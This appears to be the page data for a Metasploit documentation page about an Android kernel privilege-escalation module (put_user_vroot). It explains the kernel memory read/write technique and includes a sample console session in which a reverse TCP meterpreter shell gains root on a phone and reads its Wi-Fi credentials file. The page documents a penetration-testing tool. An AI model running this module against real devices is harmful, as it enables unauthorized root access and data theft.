{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/android/local/put_user_vroot","result":{"data":{"moduleMetadataJson":{"id":"6a86704d-a806-5e73-854e-6b746192feb0","name":"Android get_user/put_user Exploit","fullname":"exploit/android/local/put_user_vroot","description":"This module exploits a missing check in the get_user and put_user API functions\n            in the linux kernel before 3.5.5. The missing checks on these functions\n            allow an unprivileged user to read and write kernel memory.\n                This exploit first reads the kernel memory to identify the commit_creds and\n            ptmx_fops address, then uses the write primitive to execute shellcode as uid 0.\n            The exploit was first discovered in the wild in the vroot rooting application.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/android/local/put_user_vroot","documentationSlug":"/modules/documentation/exploit/android/local/put_user_vroot","referencesSlug":"/modules/references/exploit/android/local/put_user_vroot"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This modules exploits a vulnerability in the linux kernel on an Android device, which allows an untrusted app to elevate to root priviledges. On Android an application normally runs as an individual linux user, sandboxing it from the Android system and other applications. After running the exploit the resulting session has full priviledge on the device, and can access the entire filesystem and the private data files of every other app, including system apps.</p>\n<p>The exploit uses a read kernel memory primitive to first figure out the correct offsets for the device, before using the write primitive to overwrite the ptmx.fsync handler to a function that will elevate the current process to root. Finally /dev/ptmx is opened, and fsync called to trigger the exploit.</p>\n<p>This exploit should work on any vulnerable device and is not device specific. In the example below a Samsung Galaxy S4 running Android version 4.3 was targetted.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>You'll first need to obtain a session on the target device. Once the module is loaded, one simply needs to set the <code class=\"language-text\">SESSION</code> option and configure the handler. The exploit can take a while to run on the device so it is configured with <code class=\"language-text\">WfsDelay</code> option to wait 120 seconds for a session. If you have not had a session after this time you can assume the device is not vulnerable.</p>\n<p>An example session follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(handler) &gt; sessions \n\nActive sessions\n===============\n\n  Id  Type                        Information          Connection\n  --  ----                        -----------          ----------\n  1   meterpreter dalvik/android  u0_a132 @ localhost  192.168.1.52:4444 -&gt; 192.168.1.54:33549 (192.168.1.54)\n\n\nmsf exploit(handler) &gt; use exploit/android/local/put_user_vroot\n\nmsf exploit(put_user_vroot) &gt; set LHOST 192.168.1.52\nLHOST =&gt; 192.168.1.52\n\nmsf exploit(put_user_vroot) &gt; set LPORT 5555\nLPORT =&gt; 5555\n\nmsf exploit(put_user_vroot) &gt; set SESSION 1\nSESSION =&gt; 1\n\nmsf exploit(put_user_vroot) &gt; run\n\n[*] Started reverse TCP handler on 192.168.1.52:5555 \n[*] Loading exploit library /data/data/com.metasploit.stage/files/bwycy\n[*] Loaded library /data/data/com.metasploit.stage/files/bwycy, deleting\n[*] Waiting 120 seconds for payload\n[*] Sending stage (388156 bytes) to 192.168.1.54\n[*] Meterpreter session 2 opened (192.168.1.52:5555 -&gt; 192.168.1.54:59580) at 2016-12-24 00:19:12 +0800\n\n\nmeterpreter &gt; getuid \nServer username: uid=0, gid=0, euid=0, egid=0\n\nmeterpreter &gt; cat /data/misc/wifi/wpa_supplicant.conf\nctrl_interface=wlan0\n...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6a86704d-a806-5e73-854e-6b746192feb0"}}}